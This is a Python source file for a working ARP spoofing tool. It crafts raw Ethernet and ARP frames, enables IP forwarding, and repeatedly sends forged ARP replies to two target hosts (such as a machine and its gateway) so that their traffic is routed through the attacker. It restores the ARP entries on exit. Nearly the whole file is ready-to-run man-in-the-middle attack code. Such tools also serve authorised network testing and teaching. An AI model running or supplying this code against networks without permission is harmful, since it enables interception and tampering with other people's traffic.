"""
An ARP spoofer implementation in pure python.

"""
import argparse
import binascii
import re
import socket
import struct
import sys
import time


class EtherEncode:
    """ Creates an Ethernet frame. """

    def __init__(self, dst=None, src=None, proto=0x0806):
        """
        Sets the necesary values of the Ethernet frame.
        @param dst: Destination MAC Address.
        @param src: Source MAC Address.
        @param proto: Packet protocol (Default ARP=0x0806).
        """
        self._dst = self._setMAC(dst)
        self._src = self._setMAC(src)
        self._proto = struct.pack("!H", proto)

    def _setMAC(self, mac):
        """
            Returns a byte encoded MAC Address if it's a string, otherwise sets its value.
        """
        return self.encodeMAC(mac) if (mac is not None) and (not isinstance(mac, bytes)) else mac

    def craftPacket(self):
        """ Creates an Ethernet frame. """
        return self._dst + self._src + self._proto

    def isValidMAC(self, mac):
        """ Returns True if the MAC Address matches the pattern, otherwise, blows up. """
        macRegx = "(([a-f]|[0-9]){1,2}:){1,5}([a-f]|[0-9]){1,2}"
        regex = re.compile(macRegx)

        if re.fullmatch(regex, mac):
            return True

        return False

    def encodeMAC(self, mac):
        """ Encodes a valid MAC Address. """
        if not self.isValidMAC(mac):
            print("Invalid MAC address:", mac, file=sys.stderr)
            sys.exit()

        return binascii.unhexlify(mac.replace(":", ""))


class ARPEncode(EtherEncode):
    """ Creates an ARP packet. """
    def __init__(self, sMAC, sIP, dMAC, dIP, hwtype=0x001, pType=0x0800, hwsize=0x06, psize=0x04, opcode=0x0001):
        """ Sets the packet values.
        @param hwType: L2 protocol type (0x001 = Ethernet).
        @param pType: Upper protocol type (0x0800 = IPv4).
        @param hwsize: L2 address length, MAC address has 6 octects in the form 'ff:ff:ff:ff:ff:ff'.
        @param psize: Upper protocol address length, IPv4 has 4 octects '0.0.0.0'.
        @param opcode: Type of operation to be performed, 1 for request and 2 for reply.
        @param sMAC: Origin MAC address.
        @param sIP: Origin IP address.
        @param dMAC: Destination MAC address.
        @param dIP: Destination IP address.
        """
        self._sMAC = self.encodeMAC(sMAC) if not isinstance(sMAC, bytes) else sMAC
        self._dMAC = self.encodeMAC(dMAC) if not isinstance(dMAC, bytes) else dMAC
        self._sIP = socket.inet_aton(sIP)
        self._dIP = socket.inet_aton(dIP)
        self._hwtype = hwtype
        self._pType = pType
        self._hwsize = hwsize
        self._psize = psize
        self._opcode = opcode

    def craftPacket(self):
        """ Creates the ARP packet section. """
        up = struct.pack("!HHBBH", self._hwtype, self._pType, self._hwsize, self._psize, self._opcode)
        return up + self._sMAC + self._sIP + self._dMAC + self._dIP


def getInterfaceMAC(iface):
    """ Get the MAC Address of the provided interface. """
    with open("/sys/class/net/{}/address".format(iface), "r") as file:
        # Returns the MAC address without the '\n'.
        return file.readline()[:-1]


def decodeMAC(rawMac):
    """ Returns a readable MAC address.
    @param rawMac: Encoded MAC Address.
    """
    mac = binascii.hexlify(rawMac)

    # Splits the mac variable in six pieces, each of two values,
    # then returns it as a 'normal' MAC Address.
    # Like this -> 000000000000->['00', '00', '00', '00', '00', '00']->00:00:00:00:00:00
    return ":".join([mac[inx:inx + 2].decode() for inx in range(0, len(mac), 2)])


def getHostMac(targetIP, iface, srcIP, sock=None):
    """ Returns the MAC address of the provided host. """
    eth = EtherEncode(dst="ff:ff:ff:ff:ff:ff", src=getInterfaceMAC(iface))
    dstMAC = eth.encodeMAC("00:00:00:00:00:00")
    ethPacket = eth.craftPacket()

    arpPacket = ARPEncode(eth._src, srcIP, dstMAC, targetIP).craftPacket()
    packet = ethPacket + arpPacket

    try:
        if sock is None:
            sock = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.bind((iface, 0x0806))

        while True:
            sock.send(packet)
            recv = sock.recv(1024)

            if (recv[20:22] == b"\x00\x02") and (recv[0x1c:0x20] == socket.inet_aton(targetIP)):
                return recv[0x16:0x1c]

            time.sleep(2)

    except KeyboardInterrupt:
        raise KeyboardInterrupt

    except Exception:
        raise Exception


def canChangeStatus(status):
    with open("/proc/sys/net/ipv4/ip_forward") as file:
        if file.readline() != (status+'\n'):
            print(file.readline())
            return True

    return False


def changeIPForwarding(status):
    """
        Change the status of the ipv4 ip_forward file
        @param status: 1 for ON and 0 for OFF.
    """
    try:
        if not canChangeStatus(status):
            return False

        with open("/proc/sys/net/ipv4/ip_forward", 'w') as file:
            print("\033[1;31m[!]\033[0;0m Changing IP forwarding status to", status)
            file.write(status)

    except Exception:
        raise Exception


def restoreARP(srcMAC, srcIP, targetMAC, targetIP, sock=None):
    """
        Sends the ARP Original values.
    """
    print("\033[1;36m[*]\033[0;0m Restoring ARP.")
    try:
        changeIPForwarding("0")
        ethernetPacket = EtherEncode(dst=targetMAC, src=srcMAC).craftPacket()

        arpPacket = ARPEncode(srcMAC, srcIP, targetMAC, targetIP, opcode=0x0002).craftPacket()
        packet = ethernetPacket + arpPacket

        sock.send(packet)

    except Exception:
        raise Exception


def spoof(iface, target1IP, srcIP, target2IP, intervals=30):
    """ Spoofs an IP Address with your MAC address.
    @param iface: Interface to use.
    @param target1IP: Destination IP address.
    @param srcIP: Source IP address.
    @param target2IP: IP to spoof.
    @param intervals: Seconds to send the next packet (Default 30).
    """
    sock = None

    try:
        changeIPForwarding("1")
        sock = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.IPPROTO_RAW)

        srcMAC = getInterfaceMAC(iface)

        print("\033[1;32m[*]\033[0;0m Asking who-has ", target1IP)
        target1MAC = getHostMac(target1IP, iface, srcIP, sock)

        print("\033[1;32m[*]\033[0;0m Asking who-has ", target2IP)
        target2MAC = getHostMac(target2IP, iface, srcIP, sock)

        # Target 1 Packet.
        ethernetPacket1 = EtherEncode(dst=target1MAC, src=srcMAC).craftPacket()
        arpPacket1 = ARPEncode(srcMAC, target2IP, target1MAC, target1IP, opcode=0x0002).craftPacket()
        packet1 = ethernetPacket1 + arpPacket1

        # Target 2 packet.
        ethernetPacket2 = EtherEncode(dst=target2MAC, src=srcMAC).craftPacket()
        arpPacket2 = ARPEncode(srcMAC, target1IP, target2MAC, target2IP, opcode=0x0002).craftPacket()
        packet2 = ethernetPacket2 + arpPacket2

        while True:
            print("\033[1;34m[!]\033[0;0m Spoofing {0} with {1}->{2}".format(target1IP, srcMAC, target2IP))
            sock.send(packet1)

            print("\033[1;34m[!]\033[0;0m Spoofing {0} with {1}->{2}".format(target2IP, srcMAC, target1IP))
            sock.send(packet2)

            time.sleep(intervals)

    except KeyboardInterrupt:
        print("\n\033[1;31m[!]\033[0;0m User requested exit.\n")

    except Exception as genErr:
        print(genErr.with_traceback(), file=sys.stderr)

    finally:
        restoreARP(target2MAC, target2IP, target1MAC, target1IP, sock)
        restoreARP(target1MAC, target1IP, target2MAC, target2IP, sock)
        sock.close()
        sys.exit()


def main():
    parser = argparse.ArgumentParser(description="ARP spoofer", usage="arp_spoofer.py -i [interface] " +
                                     "-t [targetIP] -s [spoofIP] [sourceIP]")
    parser.add_argument("source", help="Source IP address")

    parser.add_argument("-i", dest="iface", action="store", required=True,
                        help="Interface")

    parser.add_argument("-t", dest="target1", action="store", required=True,
                        help="Target IP", metavar="IP")

    parser.add_argument("-s", dest="target2", action="store", required=True,
                        help="IP address to spoof (e.g The gateway)", metavar="IP")

    args = parser.parse_args()

    spoof(args.iface, args.target1, args.source, args.target2)


if __name__ == '__main__':
    main()
